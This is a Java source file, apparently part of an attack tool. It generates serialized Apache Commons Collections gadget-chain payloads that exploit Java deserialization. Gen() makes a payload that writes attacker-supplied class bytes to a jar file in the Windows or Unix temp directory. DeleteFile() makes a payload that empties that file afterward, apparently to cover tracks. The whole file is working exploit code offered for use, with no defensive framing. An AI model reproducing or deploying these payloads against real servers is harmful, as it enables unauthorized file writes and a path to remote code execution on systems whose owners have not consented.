package payload;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class GenPayload
{
  public static byte[] Gen(String OS, byte[] ClassByte)
    throws Exception
  {
    String Path = "C:/windows/temp/test.jar";
    if (!OS.equals("Windows")) {
      Path = "/tmp/test.jar";
    }
    Transformer[] transforms = {
      new ConstantTransformer(FileOutputStream.class), 
      new InvokerTransformer("getConstructor", 
      new Class[] { Class[].class }, 
      new Object[] { new Class[]{ String.class, Boolean.TYPE } }), 
      new InvokerTransformer("newInstance", 
      new Class[] { Object[].class }, 
      //modify the true->false by hancool
      //overwrite the file:
      new Object[] {new Object[] { Path, Boolean.valueOf(false) } }), 
      new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { ClassByte }), 
      
      new InvokerTransformer("xxx", 
      new Class[] { Class[].class }, 
      new Object[] { new Object[]{ String.class } }), 
      
      new InvokerTransformer("ttt", 
      new Class[] { Object[].class }, 
      new Object[] { new Object[]{ "just for fun" } }), 
      new ConstantTransformer(Integer.valueOf(1)) };
    Transformer transformerChain = new ChainedTransformer(transforms);
    Map innermap = new HashMap();
    innermap.put("value", "value");
    Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
    Class cls = 
      Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
    ctor.setAccessible(true);
    Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
    ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
    ObjectOutputStream out = new ObjectOutputStream(bo);
    out.writeObject(instance);
    out.flush();
    out.close();
    return bo.toByteArray();
  }
  
  public static byte[] DeleteFile(String OS)
    throws Exception
  {
	  String Path = "C:/windows/temp/test.jar";
	    if (!OS.equals("Windows")) {
	      Path = "/tmp/test.jar";
	    }
	    Transformer[] transforms = {
	      new ConstantTransformer(FileOutputStream.class), 
	      new InvokerTransformer("getConstructor", 
	      new Class[] { Class[].class }, 
	      new Object[] { new Class[]{ String.class, Boolean.TYPE } }), 
	      new InvokerTransformer("newInstance", 
	      new Class[] { Object[].class }, 
	      new Object[] {new Object[] { Path, Boolean.valueOf(false) } }), 
	      new InvokerTransformer("write", new Class[] { byte[].class }, new Object[] { new byte[0] }), 
	      
	      new InvokerTransformer("xxx", 
	      new Class[] { Class[].class }, 
	      new Object[] { new Object[]{ String.class } }), 
	      
	      new InvokerTransformer("ttt", 
	      new Class[] { Object[].class }, 
	      new Object[] { new Object[]{ "just for fun" } }), 
	      new ConstantTransformer(Integer.valueOf(1)) };
	    Transformer transformerChain = new ChainedTransformer(transforms);
	    Map innermap = new HashMap();
	    innermap.put("value", "value");
	    Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
	    Class cls = 
	      Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
	    Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
	    ctor.setAccessible(true);
	    Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
	    ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
	    ObjectOutputStream out = new ObjectOutputStream(bo);
	    out.writeObject(instance);
	    out.flush();
	    out.close();
	    return bo.toByteArray(); 
  }
}
